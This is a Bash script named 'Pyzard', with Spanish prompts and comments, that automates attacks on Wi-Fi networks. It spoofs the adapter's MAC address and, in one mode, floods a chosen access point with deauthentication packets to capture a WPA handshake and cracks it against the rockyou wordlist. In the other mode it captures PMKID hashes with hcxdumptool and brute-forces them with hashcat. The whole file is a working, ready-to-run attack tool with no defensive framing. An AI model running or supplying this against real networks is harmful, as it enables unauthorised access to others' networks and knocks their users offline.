#!/bin/bash

# Pyzard

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n$yellowColour[+] Saliendo...$endColour"
    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
    rm Captura* 2>/dev/null
    exit 0
}

function helpPanel() {
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./$0${endColour}"
    echo -e "\n\t${purpleColour}a)${endColour}${yellowColour} Modo de ataque ${endColour}"
    echo -e "\t\t${redColour}Handshake${endColour}"
    echo -e "\t\t${redColour}PKMID${endColour}"
    echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
    echo -e "\t${purpleColour}h)${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
    exit 0
}

function dependencies(){
    tput civis
    clear
    dependencies=(aircrack-ng macchanger)

    echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios ${endColour}"

    sleep 2

    for program in "${dependencies[@]}"; do
        echo -ne "\n${yellowColouir}[*]${endColour}${blueColour} Herramienta ${endColour}${purpleColour} $program ${endColour}${blueColour}...${endColour}"

        test -f /usr/bin/$program

        if [[ "$(echo $?)" == "0" ]]; then
            echo -e " ${greenColour}(V)${endColour}"
        else
            echo -e " ${redColour}(X)${endColour}"
            echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour} $program ${endColour}${yellowColour}...${endColour}"
            apt-get install $program -y > /dev/null 2>&1
        fi; sleep 1
    done
}



function startAttack(){
    clear
    echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando targeta de red...${endColour}\n"
    airmon-ng start $networkCard > /dev/null 2>&1
    ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
    ifconfig ${networkCard}mon up

    killall dhclient wpa_supplicant 2>/dev/null

    echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva direccion MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

    if [ "$(echo $attack_mode)" == "Handshake" ]; then

        # abrimos consola a parte por que airodump funciona a base de stderr

        # Convertimos en tiling window

        # xprop WM_CLASS para ver nombre de la tiling

        # en bspwmrc se debe añadir una nueva regla

        # bspc rule -a XTerm: state=floating

        xterm -hold -e "airodump-ng ${networkCard}mon" &
        airodump_xterm_PID=$!
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel

        kill -9 $airodump_xterm_PID
        wait $airodump_xterm_PID 2>/dev/null

        xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
        airodump_filter_xterm_PID=$!

        # emitimos paquetes de autenticacion para expulsar clientes de la red (Deauth attack)

        # lanzamos otra consola

        # para capturar el PID de la consola necesitamos que este en 2º plano (&)

        sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
        aireplay_xterm_PID=$!
        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

        sleep 10; kill -9 $airodump_filter_xterm_PID
        wait $airodump_filter_xterm_PID 2>/dev/null

        # Autoamtizar romper por fuerza bruta la contraseña

        xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &

        # implementamos el PKMID

    elif [ "$(echo $attack_mode)" == "PKMID" ]; then
        clear; echo -e "${yellowColour}[+]${endColour}${grayColour} Iniciando Clientless PKMID attack...${endColour}\n"

        # ejecutamos el comando a nivel de bash durante 60 segundos y que muera

        timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
        echo -e "\n\n${yellowColour}[+]${endColour}${grayColour} Obteniendo hashes...${endColour}\n"
        sleep 2

        hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null

        test -f myHashes

        if [ "$(echo $?)" == "0" ]; then

            echo -e "\n${yellowColour}[+]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
            sleep 2

            hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
        else
            echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido acpturar el paquete necesario...${endColour}\n"
            sleep 2

        fi
    else
        echo -e "\n${redColour}[+] Modo de ataque invalido ${endColour}\n"
    fi
}

# Main Function

if [[ $UID == 0 ]];then
   declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
        case $arg in
            a) attack_mode=$OPTARG; let parameter_counter+=1;;
            n) networkCard=$OPTARG; let parameter_counter+=1;;
            h) helpPanel;;
            ?) helpPanel;;
        esac
   done

   if [[ $parameter_counter -ne 2 ]]; then
        helpPanel
   else
       dependencies
       startAttack
       tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1; rm Captura* 2>/dev/null

   fi

else
    echo -e "\n${redColour} [+] Necesitas ejecutar como root / sudo ${endColour}\n"
fi
